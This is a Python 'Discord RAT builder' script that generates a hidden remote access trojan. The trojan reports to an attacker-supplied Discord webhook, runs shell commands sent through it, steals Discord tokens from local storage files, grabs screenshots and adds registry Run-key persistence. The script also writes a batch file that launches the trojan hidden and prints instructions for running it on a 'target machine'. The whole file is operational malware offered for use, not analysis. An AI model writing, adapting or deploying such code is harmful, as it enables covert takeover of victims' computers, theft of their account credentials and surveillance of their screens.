#!/usr/bin/env python3
Discord RAT Builder - Silent Background RAT

import os, sys, time, base64, random, string, platform, json, subprocess, re

def run():
    print("\n" + "="*60)
    print("DISCORD RAT BUILDER - SILENT BACKGROUND RAT")
    print("="*60)
    
    print("[!] This creates a RAT that runs silently in the background")
    print("[!] No console window will appear")
    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot, pc_info")
    print("="*60)
    
    webhook = input("\nWebhook URL: ").strip()
    
    if not webhook.startswith('https://discord.com/api/webhooks/'):
        print("\n[!] Invalid webhook URL!")
        print("[!] Format: https://discord.com/api/webhooks/ID/TOKEN")
        input("\nPress Enter to continue...")
        return
    
    filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
    
    print("\n[+] Building Silent Background Discord RAT...")
    
    code = f'''#!/usr/bin/env python3
Discord RAT - Silent Background - Fixed Command Processing

import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass, tempfile

WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"
PROCESSED_COMMANDS = set()
FIRST_RUN = True

def hide_console():
    try:
        if IS_WIN:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.FreeConsole()
        else:
            if os.fork() > 0:
                sys.exit(0)
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
    except:
        pass

def send(data):
    try:
        if len(data) > 1900:
            for i in range(0, len(data), 1900):
                requests.post(WEBHOOK, json={{'content': data[i:i+1900]}}, timeout=10)
        else:
            requests.post(WEBHOOK, json={{'content': data}}, timeout=10)
    except:
        pass

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[+] Command executed successfully (no output)"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {{str(e)}}"

def get_pc_info():
    info = []
    info.append("=== SYSTEM INFORMATION ===")
    info.append(f"Computer Name: {{platform.node()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
    info.append(f"OS Version: {{platform.version()}}")
    info.append(f"Architecture: {{platform.machine()}}")
    info.append(f"User: {{os.getlogin()}}")
    info.append(f"CPU: {{os.cpu_count()}} cores")
    
    try:
        import psutil
        info.append(f"RAM: {{round(psutil.virtual_memory().total / 1024**3, 2)}} GB")
        info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
        info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
        info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
        info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
        info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
        info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
        info.append(f"Disk Usage: {{psutil.disk_usage('/').percent}}%")
    except:
        pass
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"Public IP: {{ip}}")
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        info.append(f"Local IP: {{socket.gethostbyname(hostname)}}")
    except:
        pass
    
    info.append(f"Python Version: {{sys.version}}")
    info.append(f"Working Directory: {{os.getcwd()}}")
    info.append("="*30)
    
    return "\\n".join(info)

def steal_tokens():
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordptb\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordptb/Local Storage/leveldb/*.log"))
    
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    for line in f:
                        matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                        tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def take_screenshot():
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        img.save(img_path)
        with open(img_path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        os.remove(img_path)
        return data
    except:
        return "[!] Screenshot failed"

def persist_windows():
    if not IS_WIN:
        return "[!] Persistence only works on Windows"
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DiscordRAT", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
        return "[+] Persistence enabled"
    except:
        return "[!] Persistence failed"

def main():
    global FIRST_RUN
    
    hide_console()
    
    if FIRST_RUN:
        FIRST_RUN = False
        try:
            send("[+] RAT CONNECTED (Silent Mode)")
            time.sleep(1)
            pc_info = get_pc_info()
            send(pc_info)
            send("[+] RAT ready. Type 'help' for commands")
        except:
            pass
    
    session = requests.Session()
    session.headers.update({{'Content-Type': 'application/json'}})
    
    while True:
        try:
            resp = session.get(WEBHOOK + '?limit=10', timeout=10)
            
            if resp.status_code == 200:
                try:
                    messages = resp.json()
                    if isinstance(messages, list) and len(messages) > 0:
                        for msg in reversed(messages):
                            if 'content' in msg and msg['content']:
                                cmd = msg['content'].strip()
                                msg_id = msg.get('id', str(time.time()))
                                
                                if not cmd or msg_id in PROCESSED_COMMANDS:
                                    continue
                                
                                if msg.get('author', {{}}).get('bot', False):
                                    continue
                                
                                PROCESSED_COMMANDS.add(msg_id)
                                
                                if cmd.startswith('shell '):
                                    result = execute_cmd(cmd[6:])
                                    send(result)
                                    time.sleep(1)
                                    
                                elif cmd == 'tokens':
                                    tokens = steal_tokens()
                                    if tokens:
                                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens[:10]))
                                    else:
                                        send("[!] No tokens found")
                                        
                                elif cmd == 'sysinfo' or cmd == 'pc_info':
                                    info = get_pc_info()
                                    send(info)
                                    
                                elif cmd == 'screenshot':
                                    img = take_screenshot()
                                    if img and img != "[!] Screenshot failed":
                                        send("[+] Screenshot captured\\n" + img[:500] + "...")
                                    else:
                                        send("[!] Screenshot failed")
                                        
                                elif cmd == 'persist':
                                    result = persist_windows()
                                    send(result)
                                        
                                elif cmd == 'connected':
                                    send("[+] RAT is connected and running")
                                    pc_info = get_pc_info()
                                    send(pc_info)
                                    
                                elif cmd == 'help':
                                    help_text = """=== DISCORD RAT COMMANDS ===
shell [cmd]  - Execute system command
tokens       - Steal Discord tokens
sysinfo      - Get system information
pc_info      - Get detailed PC information
screenshot   - Take screenshot
persist      - Enable persistence
connected    - Check if RAT is connected
help         - Show this help
exit         - Stop the RAT"""
                                    send(help_text)
                                    
                                elif cmd == 'exit':
                                    send("[!] RAT shutting down...")
                                    sys.exit(0)
                                    
                                elif cmd.startswith('[') or cmd.startswith('+'):
                                    continue
                                    
                                else:
                                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
                                    
                except json.JSONDecodeError:
                    pass
                except Exception as e:
                    pass
            
            time.sleep(3)
            
        except requests.RequestException:
            time.sleep(5)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''
    
    out_dir = os.path.expanduser("~/Downloads/DiscordRAT_Output")
    os.makedirs(out_dir, exist_ok=True)
    
    py_path = os.path.join(out_dir, filename + ".py")
    with open(py_path, 'w') as f:
        f.write(code)
    
    print(f"\n[+] RAT saved to: {py_path}")
    
    bat_path = os.path.join(out_dir, filename + ".bat")
    with open(bat_path, 'w') as f:
        f.write(f'''@echo off
start /B pythonw "{py_path}"
exit
''')
    
    print(f"[+] Batch file saved to: {bat_path}")
    
    print("\n" + "="*60)
    print("HOW TO USE")
    print("="*60)
    print("1. Run the RAT on the target machine:")
    print(f"   python {filename}.py")
    print("   OR double-click the .bat file (runs hidden)")
    print("\n2. The RAT runs silently in the background")
    print("3. Send commands via webhook:")
    print("   - Go to your Discord webhook URL")
    print("   - Type a command and send it as a message")
    print("\n4. Available commands:")
    print("   shell [cmd]  - Execute system command")
    print("   tokens       - Steal Discord tokens")
    print("   sysinfo      - Get system information")
    print("   pc_info      - Get detailed PC information")
    print("   screenshot   - Take screenshot")
    print("   persist      - Enable persistence")
    print("   connected    - Check RAT status")
    print("   help         - Show help")
    print("   exit         - Stop the RAT")
    print("="*60)
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    run()
